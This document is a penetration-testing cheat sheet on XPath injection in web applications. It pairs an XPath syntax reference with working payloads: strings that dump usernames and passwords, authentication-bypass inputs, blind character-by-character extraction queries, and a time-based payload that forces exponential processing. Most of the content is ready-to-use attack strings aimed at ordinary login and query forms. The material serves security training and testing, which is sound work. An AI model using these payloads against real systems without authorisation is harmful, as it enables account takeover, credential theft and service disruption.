## XPath Injection

## Payloads:

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md
https://book.hacktricks.wiki/en/pentesting-web/xpath-injection.html

## Identification

### 1) Add gibberish in the parameter
    
    test, blah, etc

Then you may get an error like this:

    XML Error; No test entity found
    Warning: SimpleXMLElement::xpath(): Invalid expression in /var/www/html/portal.php on line 68

This verifies that it is vulnerable to XPath Injection

## Exploitation

Try to dump sensitive information like passwords and usernames.

Example payload:

Users

    ')] | //user/*[contains(*,'

Passwords

    %27)%5D/password%20%7C%20a%5Bcontains(a,%27


#### XPath Syntax

Nodes:

|Query|Explanation|
|---|---|
|`module`|Select all `module` child nodes of the context node|
|`/`|Select the document root node|
|`//`|Select descendant nodes of the context node|
|`.`|Select the context node|
|`..`|Select the parent node of the context node|
|`@difficulty`|Select the `difficulty` attribute node of the context node|
|`text()`|Select all text node child nodes of the context node|

Predicates:

|Query|Explanation|
|---|---|
|`/academy_modules/module[1]`|Select the first `module` child node of the `academy_modules` node|
|`/academy_modules/module[position()=1]`|Equivalent to the above query|
|`/academy_modules/module[last()]`|Select the last `module` child node of the `academy_modules` node|
|`/academy_modules/module[position()<3]`|Select the first two `module` child nodes of the `academy_modules` node|
|`//module[tier=2]/title/text()`|Select the `title` of all modules where the `tier` element node equals `2`|
|`//module/author[@co-author]/../title`|Select the `title` of all modules where the `author` element node has a `co-author` attribute node|
|`//module/tier[@difficulty="medium"]/..`|Select all modules where the `tier` element node has a `difficulty` attribute node set to `medium`|

Predicate Operands:

|Operand|Explanation|
|---|---|
|`+`|Addition|
|`-`|Subtraction|
|`*`|Multiplication|
|`div`|Division|
|`=`|Equal|
|`!=`|Not Equal|
|`<`|Less than|
|`<=`|Less than or Equal|
|`>`|Greater than|
|`>=`|Greater than or Equal|
|`or`|Logical Or|
|`and`|Logical And|
|`mod`|Modulus|

Wildcards:

|Query|Explanation|
|---|---|
|`node()`|Matches any node|
|`*`|Matches any `element` node|
|`@*`|Matches any `attribute` node|

Union:

|Query|Explanation|
|---|---|
|<code>//module[tier=2]/title/text() &#124; //module[tier=3]/title/text()</code>|Select the title of all modules in tiers `2` and `3`|


#### Authentication Bypass

|Description|Username|Query|
|---|---|---|
|Regular Authentication|`htb-stdnt`|`/users/user[username/text()='htb-stdnt' and password/text()='295362c2618a05ba3899904a6a3f5bc0']`|
|Bypass Authentication with known username|`admin' or '1'='1`|`/users/user[username/text()='admin' or '1'='1' and password/text()='21232f297a57a5a743894a0e4a801fc3']`|
|Bypass Authentication by position|`' or position()=1 or '`|`/users/user[username/text()='' or position()=1 or '' and password/text()='21232f297a57a5a743894a0e4a801fc3']`|
|Bypass Authentication by substring|`' or contains(.,'admin') or '`|`/users/user[username/text()='' or contains(.,'admin') or '' and password/text()='21232f297a57a5a743894a0e4a801fc3']`|

#### Data Exfiltration

Unrestricted:
- Leak entire XML document via union injection: `| //text()`

Restricted:
- Determine schema depth via chain of wildcards `/*[1]`
- iterate through XML schema by increasing the indices to exfiltrate the entire document step-by-step

#### Blind Data Exfiltration

|Description|Payload|Query|
|---|---|---|
|Exfiltrating Node Name's Length|`invalid' or string-length(name(/*[1]))=1 and '1'='1`|`/users/user[username='invalid' or string-length(name(/*[1]))=1 and '1'='1']`|
|Exfiltrating Node Name|`invalid' or substring(name(/*[1]),1,1)='a' and '1'='1`|`/users/user[username='invalid' or substring(name(/*[1]),1,1)='a' and '1'='1']`|
|Exfiltrating Number of Child Nodes|`invalid' or count(/*[1]/*)=1 and '1'='1`|`/users/user[username='invalid' or count(/*[1]/*)=1 and '1'='1']`|
|Exfiltrating Value Length|`invalid' or string-length(/users/user[1]/username)=1 and '1'='1`|`/users/user[username='invalid' or string-length(/users/user[1]/username)=1 and '1'='1']`|
|Exfiltrating Value|`invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1`|`/users/user[username='invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1']`|

#### Time-based

Force the web application to iterate over the entire XML document exponentially:

```xpath
count((//.)[count((//.))])
```

Determine whether the first letter of the "username" is "a" based on the time it takes: if it is, the query will utilize a significant processing time, otherwise, it won't.

```xpath
invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1
```
